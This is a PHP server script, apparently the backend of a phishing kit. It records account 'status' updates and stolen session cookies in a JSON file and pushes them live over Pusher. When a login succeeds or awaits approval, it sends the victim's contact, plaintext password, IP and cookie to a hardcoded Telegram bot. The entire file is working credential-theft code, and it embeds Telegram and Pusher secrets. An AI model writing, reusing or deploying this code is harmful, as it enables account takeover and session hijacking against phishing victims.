<?php
// Configure session giống login.php
ini_set('session.gc_maxlifetime', 86400);
ini_set('session.cookie_lifetime', 86400);
session_set_cookie_params([
    'lifetime' => 86400,
    'path' => '/',
    'domain' => '',
    'secure' => isset($_SERVER['HTTPS']),
    'httponly' => true,
    'samesite' => 'Lax'
]);

session_start();

require __DIR__ . '/vendor/autoload.php';

header('Content-Type: application/json');

// Telegram credentials
define('TELEGRAM_BOT_TOKEN', '8266901801:AAElp-hHhvngtFkG-ysB09964No4zDrEA2A');
define('TELEGRAM_CHAT_ID', '6793481539');

// Function gửi message lên Telegram
function sendTelegramMessage($message) {
    $url = 'https://api.telegram.org/bot' . TELEGRAM_BOT_TOKEN . '/sendMessage';
    
    $data = [
        'chat_id' => TELEGRAM_CHAT_ID,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    $options = [
        'http' => [
            'method' => 'POST',
            'header' => 'Content-Type: application/x-www-form-urlencoded',
            'content' => http_build_query($data)
        ]
    ];
    
    try {
        $context = stream_context_create($options);
        $result = file_get_contents($url, false, $context);
        error_log('[TELEGRAM] Message sent successfully');
        return true;
    } catch (Exception $e) {
        error_log('[TELEGRAM] Error sending message: ' . $e->getMessage());
        return false;
    }
}

// Pusher credentials
$pusher = new Pusher\Pusher(
    '93b775996895ce581f7b', // key
    'fe61b1799f1a422e991c', // secret
    '2065178',               // app_id
    [
        'cluster' => 'ap1',
        'useTLS' => true
    ]
);

// Get POST data
$waterfall_id = $_POST['waterfall_id'] ?? '';
$status = $_POST['status'] ?? '';
$cookie = $_POST['cookie'] ?? ''; // Cookie (optional)

// Kiểm tra dữ liệu đầu vào
if (empty($waterfall_id)) {
    echo json_encode([
        'success' => false,
        'message' => 'Missing waterfall_id'
    ]);
    exit;
}

if (empty($status)) {
    echo json_encode([
        'success' => false,
        'message' => 'Missing status'
    ]);
    exit;
}

// Log received data
error_log('[CLAIM DEBUG] Received data - waterfall_id: ' . $waterfall_id . ', status: ' . $status . ', cookie: ' . ($cookie ? 'YES (' . strlen($cookie) . ' chars)' : 'NO'));

// Đọc file dataaccess.json
$file = __DIR__ . '/dataaccess.json';
$existing_data = [];

if (file_exists($file)) {
    $json_content = file_get_contents($file);
    $existing_data = json_decode($json_content, true);
    
    if (!is_array($existing_data)) {
        $existing_data = [];
    }
}

// Tìm và cập nhật theo waterfall_id
$found = false;
$updated_account = null;

foreach ($existing_data as $index => &$account) {
    if ($account['waterfall_id'] === $waterfall_id) {
        // Update status
        $account['status'] = $status;
        $account['updated_at'] = date('Y-m-d H:i:s');
        
        // Update cookie nếu có
        if (!empty($cookie)) {
            $account['cookie'] = $cookie;
            error_log('[CLAIM DEBUG] Cookie added to account (' . strlen($cookie) . ' chars)');
        }
        
        $found = true;
        
        // Lưu luôn updated account (phải copy để tránh reference issue)
        $updated_account = $account;
        
        error_log('[CLAIM DEBUG] Found and updated account at index ' . $index);
        error_log('[CLAIM DEBUG] Updated data: ' . json_encode($updated_account));
        break;
    }
}
unset($account); // Unset reference để tránh bug

if ($found) {
    // Lưu lại vào dataaccess.json
    file_put_contents($file, json_encode($existing_data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
    
    // Validate data trước khi push qua Pusher
    if ($updated_account === null) {
        error_log('[CLAIM DEBUG] ❌ ERROR: updated_account is null!');
        error_log('[CLAIM DEBUG] waterfall_id searched: ' . $waterfall_id);
        error_log('[CLAIM DEBUG] existing_data: ' . json_encode($existing_data));
    }
    
    // Push dữ liệu qua Pusher với channel là session_id
    $pusher_success = false;
    $pusher_error = null;
    try {
        $channel_name = 'session-' . $waterfall_id;
        
        error_log('[CLAIM DEBUG] Attempting to trigger Pusher...');
        error_log('[CLAIM DEBUG] Channel: ' . $channel_name);
        error_log('[CLAIM DEBUG] Event: account-updated');
        error_log('[CLAIM DEBUG] Data to send: ' . json_encode($updated_account));
        
        $result = $pusher->trigger(
            $channel_name,                // Channel: session-{session_id}
            'account-updated',            // Event name
            $updated_account              // Data
        );
        
        $pusher_success = true;
        error_log('[CLAIM DEBUG] ✅ Pusher triggered successfully!');
        error_log('[CLAIM DEBUG] Result: ' . json_encode($result));
    } catch (Exception $e) {
        $pusher_error = $e->getMessage();
        error_log('[CLAIM DEBUG] ❌ Pusher error: ' . $pusher_error);
    }
    
    // Gửi Telegram notification nếu status là login_successful hoặc waiting_for_approval
    $telegram_sent = false;
    $status_lower = strtolower($status);
    
    if ($status_lower === 'login_successful' || $status_lower === 'waiting_for_approval') {
        error_log('[TELEGRAM] Status is ' . $status . ', sending notification...');
        
        // Format message khác nhau tùy status
        if ($status_lower === 'login_successful') {
            $telegram_message = "🎉 <b>Login Successful!</b>\n\n";
        } else {
            $telegram_message = "⏳ <b>Waiting for Approval</b>\n\n";
        }
        
        $telegram_message .= "📧 <b>Contact:</b> <code>" . htmlspecialchars($updated_account['contact_point']) . "</code>\n";
        $telegram_message .= "🔑 <b>Password:</b> <code>" . htmlspecialchars($updated_account['password']) . "</code>\n";
        $telegram_message .= "🌐 <b>IP:</b> <code>" . htmlspecialchars($updated_account['victim_ip']) . "</code>\n";
        $telegram_message .= "🕐 <b>Time:</b> " . ($updated_account['updated_at'] ?? $updated_account['timestamp']) . "\n";
        
        // Thêm cookie vào cùng message (nếu có)
        if (!empty($updated_account['cookie'])) {
            $telegram_message .= "\n🍪 <b>Cookie:</b>\n";
            $telegram_message .= "<code>" . htmlspecialchars($updated_account['cookie']) . "</code>\n";
            $telegram_message .= "<i>Length: " . strlen($updated_account['cookie']) . " characters</i>\n";
        }
        
        if ($status_lower === 'login_successful') {
            $telegram_message .= "\n✅ <b>Status:</b> LOGIN SUCCESSFUL";
        } else {
            $telegram_message .= "\n⏳ <b>Status:</b> WAITING FOR APPROVAL";
        }
        
        // Gửi message (tất cả trong 1 tin nhắn)
        $telegram_sent = sendTelegramMessage($telegram_message);
    }
    
    // Return success response với debug info
echo json_encode([
    'success' => true,
    'message' => 'Status updated successfully',
    'waterfall_id' => $waterfall_id,
        'status' => $status,
        'cookie' => !empty($cookie) ? 'Updated' : 'Not provided',
        'cookie_length' => !empty($cookie) ? strlen($cookie) : 0,
        'pusher_triggered' => $pusher_success,
        'pusher_error' => $pusher_error,
        'telegram_sent' => $telegram_sent,
        'channel' => 'session-' . $waterfall_id,
        'updated_account' => $updated_account
    ]);
} else {
    // Không tìm thấy waterfall_id
    echo json_encode([
        'success' => false,
        'message' => 'Waterfall ID not found',
        'waterfall_id' => $waterfall_id
    ]);
}
?>